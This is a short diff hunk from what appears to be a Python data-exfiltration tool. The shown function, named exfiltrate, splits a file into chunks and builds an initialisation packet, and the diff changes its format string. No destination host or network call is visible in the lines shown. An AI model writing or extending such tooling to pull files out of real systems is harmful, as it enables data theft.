@@ -120,7 +120,7 @@ def exfiltrate(file_name, key="shut_the_fuck_up_donnie!"):
     packet_cntr = len(chunksies)
 
     # Build and send initiallaztion packet
-    inital_packet = "%s%s%s%s" % (  packet_cntr,
+    inital_packet = "%s%s%s%s%s" % (  packet_cntr,
                                     DELIMITER,
                                     digest,
                                     DELIMITER,
